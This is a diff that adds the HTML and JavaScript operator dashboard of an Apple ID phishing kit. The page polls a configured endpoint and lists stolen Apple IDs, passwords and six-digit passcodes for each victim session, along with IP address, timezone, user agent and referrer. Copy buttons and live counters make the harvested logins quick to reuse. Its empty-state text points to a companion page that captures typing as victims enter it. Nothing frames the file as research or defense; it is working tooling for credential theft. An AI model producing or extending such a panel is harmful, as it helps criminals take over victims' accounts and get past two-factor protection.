@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Captures</title>
+<style>
+:root{--bg:#0b0b0d;--card:#16161a;--line:#2a2a31;--fg:#f2f2f5;--muted:#8b8b95;--ok:#30d158;--warn:#ff9f0a;--blue:#0a84ff}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 -apple-system,BlinkMacSystemFont,"SF Pro Text",Segoe UI,Roboto,sans-serif}
+header{position:sticky;top:0;background:rgba(11,11,13,.9);backdrop-filter:blur(12px);border-bottom:1px solid var(--line);padding:14px 18px;display:flex;align-items:center;gap:14px;flex-wrap:wrap;z-index:5}
+h1{font-size:15px;font-weight:600;margin:0;letter-spacing:-.01em}
+.stats{display:flex;gap:8px;font-size:12px;color:var(--muted)}
+.stats b{color:var(--fg)}
+.spacer{flex:1}
+button{background:#22222a;color:var(--fg);border:1px solid var(--line);border-radius:8px;padding:7px 12px;font:inherit;font-size:12px;cursor:pointer}
+button:hover{background:#2c2c36}
+main{padding:16px;display:grid;gap:12px;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));max-width:1400px;margin:0 auto}
+.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px}
+.top{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--muted);flex:none}
+.dot.live{background:var(--ok);box-shadow:0 0 0 3px rgba(48,209,88,.18)}
+.dot.pw{background:var(--warn)}
+.dot.done{background:var(--blue)}
+.when{font-size:11px;color:var(--muted);margin-left:auto;white-space:nowrap}
+.row{display:flex;gap:8px;padding:7px 0;border-top:1px solid var(--line);align-items:baseline}
+.k{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.06em;width:74px;flex:none}
+.v{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;word-break:break-all;flex:1}
+.v.empty{color:#4a4a54;font-style:italic;font-family:inherit}
+.copy{background:none;border:0;color:var(--blue);font-size:11px;cursor:pointer;padding:0 0 0 6px;flex:none}
+.meta{font-size:11px;color:var(--muted);margin-top:10px;line-height:1.6}
+.empty-state{padding:60px 20px;text-align:center;color:var(--muted);grid-column:1/-1}
+</style>
+</head>
+<body>
+<header>
+  <h1>Captures</h1>
+  <div class="stats">sessions <b id="sessions">0</b> · creds <b id="creds">0</b> · passcodes <b id="pins">0</b></div>
+  <div class="spacer"></div>
+  <button id="refresh">Refresh</button>
+  <button id="clear">Clear</button>
+</header>
+<main id="list"><div class="empty-state">Waiting for data…</div></main>
+<script src="config.js"></script>
+<script>
+(function(){
+  var cfg = window.CONFIG || {};
+  var list = document.getElementById('list');
+  var timers = {};
+
+  function fmt(ts){
+    var d = new Date(ts||Date.now());
+    return d.toLocaleString([], {month:'short', day:'2-digit', hour:'2-digit', minute:'2-digit', second:'2-digit'});
+  }
+  function esc(s){ return String(s==null?'':s).replace(/[&<>"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]; }); }
+
+  function load(){
+    if(cfg.READ){
+      return fetch(cfg.READ + (cfg.READ.indexOf('?')>-1?'&':'?') + 't=' + Date.now())
+        .then(function(r){ return r.json(); })
+        .catch(function(){ return local(); });
+    }
+    return Promise.resolve(local());
+  }
+  function local(){
+    try{ return JSON.parse(localStorage.getItem('captures')||'[]'); }catch(e){ return []; }
+  }
+
+  function render(rows){
+    var bySid = {}, order = [];
+    rows.forEach(function(r){
+      var k = r.sid || 'x';
+      if(!bySid[k]){ bySid[k] = {sid:k, first:r.ts, last:r.ts, appleid:'', password:'', passcode:'', stage:'', ip:'', tz:'', ua:'', ref:''}; order.push(k); }
+      var s = bySid[k];
+      s.last = r.ts || s.last;
+      if(r.appleid) s.appleid = r.appleid;
+      if(r.password) s.password = r.password;
+      if(r.passcode) s.passcode = r.passcode;
+      if(r.stage) s.stage = r.stage;
+      if(r.ip) s.ip = r.ip;
+      if(r.tz) s.tz = r.tz;
+      if(r.ua) s.ua = r.ua;
+      if(r.ref) s.ref = r.ref;
+    });
+
+    var sessions = order.map(function(k){ return bySid[k]; }).sort(function(a,b){ return b.last - a.last; });
+    document.getElementById('sessions').textContent = sessions.length;
+    document.getElementById('creds').textContent = sessions.filter(function(s){ return s.password; }).length;
+    document.getElementById('pins').textContent = sessions.filter(function(s){ return s.passcode && s.passcode.length===6; }).length;
+
+    if(!sessions.length){
+      list.innerHTML = '<div class="empty-state">No captures yet. Open the page and start typing.</div>';
+      return;
+    }
+
+    list.innerHTML = sessions.map(function(s){
+      var cls = s.passcode && s.passcode.length===6 ? 'done' : (s.password ? 'pw' : 'live');
+      return '<div class="card">' +
+        '<div class="top"><span class="dot ' + cls + '"></span><b style="font-size:12px">' + (s.ip ? esc(s.ip) : 'no ip') + '</b>' +
+        '<span class="when">' + fmt(s.last) + '</span></div>' +
+        '<div class="row"><span class="k">Apple ID</span><span class="v' + (s.appleid?'':' empty') + '">' + (esc(s.appleid) || '—') + '</span>' + (s.appleid?'<button class="copy" data-c="'+esc(s.appleid)+'">copy</button>':'') + '</div>' +
+        '<div class="row"><span class="k">Password</span><span class="v' + (s.password?'':' empty') + '">' + (esc(s.password) || '—') + '</span>' + (s.password?'<button class="copy" data-c="'+esc(s.password)+'">copy</button>':'') + '</div>' +
+        '<div class="row"><span class="k">Passcode</span><span class="v' + (s.passcode?'':' empty') + '">' + (esc(s.passcode) || '—') + '</span>' + (s.passcode?'<button class="copy" data-c="'+esc(s.passcode)+'">copy</button>':'') + '</div>' +
+        '<div class="meta">' + esc(s.tz || '') + (s.tz?' · ':'') + 'first seen ' + fmt(s.first) + (s.ref ? ' · from ' + esc(s.ref) : '') + '<br>' + esc(s.ua || '') + '</div>' +
+        '</div>';
+    }).join('');
+
+    [].forEach.call(list.querySelectorAll('.copy'), function(b){
+      b.addEventListener('click', function(){
+        navigator.clipboard.writeText(b.dataset.c);
+        b.textContent = 'ok';
+        setTimeout(function(){ b.textContent = 'copy'; }, 900);
+      });
+    });
+  }
+
+  function tick(){ load().then(render); }
+
+  document.getElementById('refresh').addEventListener('click', tick);
+  document.getElementById('clear').addEventListener('click', function(){
+    if(!confirm('Clear all captures?')) return;
+    if(cfg.READ){
+      fetch(cfg.READ + (cfg.READ.indexOf('?')>-1?'&':'?') + 'action=clear').then(tick);
+    } else {
+      localStorage.removeItem('captures'); tick();
+    }
+  });
+
+  tick();
+  timers.main = setInterval(function(){ if(!document.hidden) tick(); }, 4000);
+})();
+</script>
+</body>
+</html>
